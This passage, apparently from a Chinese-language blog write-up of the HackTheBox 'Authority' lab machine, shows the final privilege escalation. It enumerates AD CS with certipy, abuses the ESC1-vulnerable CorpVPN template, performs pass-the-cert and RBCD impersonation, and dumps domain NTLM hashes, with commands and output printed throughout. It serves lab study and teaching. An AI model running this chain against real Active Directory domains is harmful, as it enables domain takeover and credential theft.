+<h1 id="Shell-as-administrator"><a href="#Shell-as-administrator" class="headerlink" title="Shell as administrator"></a>Shell as administrator</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>在Windows DC上枚举ADCS总是值得的。已经展示certipy(pipx install certipy-ad) <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==">Certipy GitHub<i class="fa fa-external-link-alt"></i></span>之前的<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzA1LzI3L2h0Yi1hYnNvbHV0ZS5odG1sI3NoYWRvdy1jcmVkZW50aWFs">HTB: Absolute<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzA2LzE3L2h0Yi1lc2NhcGUuaHRtbCNzaGVsbC1hcy1hZG1pbmlzdHJhdG9y">htb: escape<i class="fa fa-external-link-alt"></i></span>。使用find命令来识别模板，使用-vulnerable只显示易受攻击的模板:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  certipy find -u svc_ldap@authority.htb -p <span class="string">&#x27;lDaP_1n_th3_cle4r!&#x27;</span> -dc-ip 10.10.11.222 -vulnerable</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 37 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 13 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;AUTHORITY-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;AUTHORITY-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;AUTHORITY-CA&#x27;</span> via RRP</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;AUTHORITY-CA&#x27;</span></span><br><span class="line">[*] Saved BloodHound data to <span class="string">&#x27;20231211015614_Certipy.zip&#x27;</span>. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to <span class="string">&#x27;20231211015614_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saved JSON output to <span class="string">&#x27;20231211015614_Certipy.json&#x27;</span></span><br><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  <span class="built_in">cat</span> 20231211015614_Certipy.txt</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : AUTHORITY-CA</span><br><span class="line">    DNS Name                            : authority.authority.htb</span><br><span class="line">    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb</span><br><span class="line">    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4</span><br><span class="line">    Certificate Validity Start          : 2023-04-24 01:46:26+00:00</span><br><span class="line">    Certificate Validity End            : 2123-04-24 01:56:25+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption <span class="keyword">for</span> Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : AUTHORITY.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : AUTHORITY.HTB\Administrators</span><br><span class="line">                                          AUTHORITY.HTB\Domain Admins</span><br><span class="line">                                          AUTHORITY.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : AUTHORITY.HTB\Administrators</span><br><span class="line">                                          AUTHORITY.HTB\Domain Admins</span><br><span class="line">                                          AUTHORITY.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : AUTHORITY.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : CorpVPN</span><br><span class="line">    Display Name                        : Corp VPN</span><br><span class="line">    Certificate Authorities             : AUTHORITY-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate</span><br><span class="line">                                          PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Client Authentication</span><br><span class="line">                                          Document Signing</span><br><span class="line">                                          IP security IKE intermediate</span><br><span class="line">                                          IP security use</span><br><span class="line">                                          KDC Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 20 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : AUTHORITY.HTB\Domain Computers</span><br><span class="line">                                          AUTHORITY.HTB\Domain Admins</span><br><span class="line">                                          AUTHORITY.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : AUTHORITY.HTB\Administrator</span><br><span class="line">        Write Owner Principals          : AUTHORITY.HTB\Domain Admins</span><br><span class="line">                                          AUTHORITY.HTB\Enterprise Admins</span><br><span class="line">                                          AUTHORITY.HTB\Administrator</span><br><span class="line">        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins</span><br><span class="line">                                          AUTHORITY.HTB\Enterprise Admins</span><br><span class="line">                                          AUTHORITY.HTB\Administrator</span><br><span class="line">        Write Property Principals       : AUTHORITY.HTB\Domain Admins</span><br><span class="line">                                          AUTHORITY.HTB\Enterprise Admins</span><br><span class="line">                                          AUTHORITY.HTB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : <span class="string">&#x27;AUTHORITY.HTB\\Domain Computers&#x27;</span> can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>
+
+<p>在底部，它识别了一个名为CorpVPN的模板，该模板容易受到ESC1的攻击。还将注意到AUTHORITY-CA的CA名称。</p>
+<h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2FidXNpbmctYWN0aXZlLWRpcmVjdG9yeS1jZXJ0aWZpY2F0ZS1zZXJ2aWNlcy1wYXJ0LW9uZS8=">Abusing Active Directory Certificate Services – Part One<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3Jvd2UuY29tL2N5YmVyc2VjdXJpdHktd2F0Y2gvZXhwbG9pdGluZy1hZC1jcy1hLXF1aWNrLWxvb2stYXQtZXNjMS1lc2M4">Exploiting AD CS: A quick look at ESC1 and ESC8<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py <span class="string">&#x27;authority.htb/svc_ldap&#x27;</span> -method LDAPS -computer-name <span class="string">&#x27;EVIL01&#x27;</span> -computer-pass <span class="string">&#x27;fdvoid0&#x27;</span> -dc-ip 10.10.11.222</span><br><span class="line"></span><br><span class="line">lDaP_1n_th3_cle4r!</span><br><span class="line"></span><br><span class="line">certipy req -username EVIL01$ -password <span class="string">&#x27;fdvoid0&#x27;</span> -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug</span><br><span class="line"></span><br><span class="line">python3 /root/PassTheCert/Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to <span class="string">&#x27;AUTHORITY$&#x27;</span> -delegate-from <span class="string">&#x27;EVIL01$&#x27;</span></span><br><span class="line"></span><br><span class="line">getST.py -spn <span class="string">&#x27;cifs/AUTHORITY.authority.htb&#x27;</span> -impersonate Administrator <span class="string">&#x27;authority.htb/EVIL01$:fdvoid0&#x27;</span></span><br><span class="line"></span><br><span class="line"> ✘ ⚡ root@kali  ~/hackthebox/machine/authority  secretsdump.py -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm</span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::</span><br><span class="line">svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::</span><br><span class="line">AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:ae69c697c3873d5ef03c24d7091e7a16:::</span><br><span class="line">EVIL01$:11602:aad3b435b51404eeaad3b435b51404ee:9d3bb2d3f1edbdff68c016035a4ba13b:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+<h1 id="Reference-Sources"><a href="#Reference-Sources" class="headerlink" title="Reference Sources"></a>Reference Sources</h1><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzEyLzA5L2h0Yi1hdXRob3JpdHkuaHRtbA==">0xdf’s blog Authority walkthrough<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B3bS1wcm9qZWN0L3B3bQ==">PWM is an open source password self-service application for LDAP directories.<i class="fa fa-external-link-alt"></i></span></li>
+<li><a href=""></a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>fdvoid0
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2023/12/11/htb-authority/" title="HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack]">https://fdlucifer.github.io/2023/12/11/htb-authority/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="fa fa-stack-exchange"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/DC/" rel="tag"><i class="fa fa-tag"></i> DC</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/07/01/2023-chunqiubei-spring-php-again/" rel="prev" title="2023年春秋杯网络安全联赛春季赛 web php_again [PHP 8.2.2 OPcache Binary Webshell + CVE-2022-42919 LPE]">
+                  <i class="fa fa-chevron-left"></i> 2023年春秋杯网络安全联赛春季赛 web php_again [PHP 8.2.2 OPcache Binary Webshell + CVE-2022-42919 LPE]
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>Word count total: </span>
+    <span title="Word count total">647k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>Reading time total &asymp;</span>
+    <span title="Reading time total">39:14</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
